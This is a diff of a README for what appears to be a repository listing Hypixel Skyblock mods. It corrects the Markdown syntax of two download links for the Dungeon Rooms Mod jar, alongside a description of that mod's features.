@@ -17,7 +17,7 @@ OdinClient is very useful for players who want to progress in skills without was
 
 <img src="img/odinclient.png" width="100%" height="100%" />
 
-### Dungeon Rooms Mod [Download Dungeon Rooms]((https://github.com/NeviHype/Mod-Skyblock-Hypixel/releases/download/Dungeon-Rooms-Mod/Dungeon_Rooms-3.4.1.jar)
+### Dungeon Rooms Mod [Download Dungeon Rooms](https://github.com/NeviHype/Mod-Skyblock-Hypixel/releases/download/Dungeon-Rooms-Mod/Dungeon_Rooms-3.4.1.jar)
 Dungeon Rooms Mod is designed to help players navigate dungeons, which are among the most challenging aspects of Hypixel Skyblock. This mod is especially useful for those who want to complete dungeons quickly and earn high-level rewards, and it offers features such as:
 
   ● Room identification: with visual indicators, players can quickly understand what type of room they are about to face and where they are in relation to objectives.
@@ -28,7 +28,7 @@ Dungeon Rooms Mod is designed to help players navigate dungeons, which are among
   
 Dungeon Rooms Mod is perfect for players who want to improve their dungeon performance, avoiding wasted time and increasing their chances of success.
 
-[Download Dungeon Rooms]((https://github.com/NeviHype/Mod-Skyblock-Hypixel/releases/download/Dungeon-Rooms-Mod/Dungeon_Rooms-3.4.1.jar)
+[Download Dungeon Rooms](https://github.com/NeviHype/Mod-Skyblock-Hypixel/releases/download/Dungeon-Rooms-Mod/Dungeon_Rooms-3.4.1.jar)
 
 ![Example Picture](https://hypixel.net/attachments/2481105/)
 
